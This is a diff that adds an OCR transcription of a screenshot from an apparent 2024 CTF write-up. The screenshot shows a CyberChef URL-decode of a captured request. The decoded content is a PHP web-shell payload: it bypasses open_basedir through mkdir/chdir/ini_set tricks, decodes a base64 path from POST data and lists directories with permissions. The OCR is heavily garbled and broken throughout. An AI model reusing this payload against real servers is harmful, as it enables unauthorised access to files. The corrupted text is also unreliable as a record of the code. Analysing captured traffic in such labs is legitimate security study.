@@ -1,0 +1,33 @@
+# OCR: c079d3eb642116f888ce594f2ffa4db7.jpg
+# 来源: .\02-WriteUp\2024\c079d3eb642116f888ce594f2ffa4db7.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:40
+
+Recipe
+URL Decode
+ou
+Input 十 口 口 白 西
+nitpuatpiorrszpcoepiepJtent t inttJpurtnaotenLnttoinm edrttta
+“Aopdir)X2@X7BX24opare20preg_ split K22¥2FESCASCXSCASCATCASCR2FA2F22X2CK2AOpAN )RBBR2AOCAAxDDdI Mame (X24_SERVERXSERZZSCR
+{PT_FILENAME%22850 )X36%24tmdirX30%22.39dae7X22%30%omkdir (2Atndir)XBBMOchdin(L24tndir)XSBXABIni_set(X22open_basedirX22
+2022. .422)"28For (5241 XB0OKIBL2ALXICS A zeof(2Aoparr)X3BX24LXIEX2)NTBVOChdL (22. .X22)K2BA7DRALnK_set (220pen_basedie
+uncbzpppDeeniirtauon ar.RtrirJispooefactiouztmtintJpineerapeniopepotme
+Lonk20asoutput()7ER2AoutputXaDob_get_contents()%3E0b_end_clean( )X3BechoX20X22650%22.22692X72%3BechoR2ONABasenc(K240utp
+ut) %3Becho&20422620036%22.1224F23ea422X38X7Oeb_start()33BtryS7ERLAOXSDbase64 decode( substr(%24 POSTXSEX2200b6dc7ea25743%
+22850422) )X3BX24F¥DUAEopendi (2240) X38 (X24F3OLIONULL) E7Becho X22ERRORLSARDFXIFHZOPathHA2ONOtX2OFoundX2BOrA2ONCR2EPEr
+smisson!22) 2308701 seX76%24HCS00ULLX36S24LXSONULLY3Ouhi Le (X24NA30N4Or ead n(24F))X7EX2APRIO2ED. E2AL3BA2ATHIDLAAdate(
+x22V-m- d420}A3AiX3AsE22%2CLOF emt ime 24P) )XSBLEAL2AELSDsubstr(base_convert (240F leperms (224P)22C1@%2C8)32C-
+Jpeoutppoxepo nn ethetroal .K22NOOK22. RIAE,AIDWARIZGOLF(RA0S_dir(24P) )82AM,XBOADIN- AIT
+22. 424R%3Be] seH20X24L ABDKZAN.24REIBL7DEchoH2—L2AM.X24L X3BLAOC losedin (24 )XSBX7DLIBL7OCat ch (Except ionk2Wk2Ae)X7BechoX
+‘okz2ERRORAIARZFAOFR2Z.A2Ae-R3EGetHessage( )XSBX7DN3Basoutput ()X38d1e() 838
+mets Ou
+Output aon
+Gink_set(“display errors", “0");Gset_tine_limit(8);$opdir=@ini_get(“open_basedir");1f(Sopdir)
+{Soparr=peeg_split("/\\\\|\V/",$opdin) ;S$ocwdedirnane($_ SERVER[ SCRIPT_FILENAME™]);Stadir=" 394967" sGakdin(Stmdin) ;@chatr
+(Stadin) @ini_set(“open_basedir",”..");for($i-0;$4<sizeof (Soparr) $i++)
+r
+"en0036"."6f23ea";}ob_start():try
+{echo("ERROR:// Path Not Found Or
+Sess" sortLeine(50))eseosustr(ouse-convert(QfLeperas($P)1,0),-4);5t="
+"yA (@is_dir($0))$91.50.°7" $Rselse $L.-5N.5R;]echo $9.51 Gclosedin($F)5};)eatch(Exception $e)(echo “ERROR: //".Se-
+>eetNessage(); }sasoutput();die();!
